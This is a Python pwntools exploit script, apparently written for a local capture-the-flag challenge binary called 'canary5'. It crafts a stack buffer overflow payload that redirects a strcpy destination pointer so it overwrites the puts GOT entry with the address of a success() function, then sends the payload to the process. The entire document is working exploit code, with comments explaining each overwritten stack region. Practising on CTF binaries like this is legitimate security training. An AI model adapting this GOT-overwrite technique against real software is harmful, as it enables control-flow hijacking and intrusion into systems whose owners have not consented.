from pwn import *

elf = ELF('/root/Desktop/TEST_CTF/kali-vm_local-ctf/challenges/canary/canary5')

success_addr 	= elf.symbols['success']
puts_got_addr	= elf.got['puts']

print "[*] success() function @ "+hex(success_addr)
print "[*] puts.GOT entry @ "+hex(puts_got_addr)

#Address of puts() GOT entry
addr_puts_overwrite 	= p32(puts_got_addr, endian='little')
#Address of the success() function. Overwrite puts() GOT entry with this.
addr_success		= p32(success_addr, endian='little')
#Append null-byte so that when strcpy() is called it will stop copying bytes after copying addr_success
addr_success		+= '\x00'

'''
Junk bytes to fill space inbetween addr_puts_overwrite and addr_success
These bytes can be any value (except 0x0A == '\n'), but differing values were chosen to make debugging easier
'''
#fill remaining char buffer space
junk 			= '\x41'*(32-len(addr_success))
#overwrite func1()'s saved base pointer @ [ebp]
junk			+= '\x42'*4
#overwrite the 8 bytes of space inbetween [ebp] the *dest arg passed to func1() from main() @ [ebp+0x8]
junk			+= '\x43'*8

payload			= addr_success + junk + addr_puts_overwrite



proc = process('/root/Desktop/TEST_CTF/kali-vm_local-ctf/challenges/canary/canary5')

output = proc.recvline(timeout=2)
print "[*] Recieved: "+output

print "[*] Sending payload: "+payload
proc.sendline(payload)

output = proc.recvrepeat(0.5)
print "[*] Recieved: \n"+output

proc.close()

